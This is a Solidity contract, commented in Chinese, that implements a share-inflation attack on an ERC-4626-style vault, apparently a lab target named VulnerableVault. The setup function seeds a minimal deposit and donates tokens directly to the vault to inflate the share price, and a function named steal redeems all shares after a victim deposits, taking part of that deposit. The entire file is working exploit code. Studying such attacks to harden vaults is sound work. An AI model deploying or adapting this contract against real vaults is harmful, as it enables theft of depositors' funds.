// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "./VulnerableVault.sol";

/// @title 链上攻击合约：首存 + 捐赠 + 等受害者存款后赎回
contract InflationAttacker {
    using SafeERC20 for IERC20;

    VulnerableVault public immutable vault;
    IERC20 public immutable asset;

    constructor(VulnerableVault vault_) {
        vault = vault_;
        asset = vault_.asset();
    }

    /// @param seedDeposit 首存金额（建议 1 wei）
    /// @param donation 直接转入金库的捐赠额，用于抬高份额单价
    function setup(uint256 seedDeposit, uint256 donation) external {
        asset.safeTransferFrom(msg.sender, address(this), seedDeposit + donation);
        asset.approve(address(vault), seedDeposit);
        vault.deposit(seedDeposit, address(this));
        asset.safeTransfer(address(vault), donation);
    }

    function steal() external {
        uint256 shares = vault.balanceOf(address(this));
        vault.redeem(shares, msg.sender, address(this));
    }
}
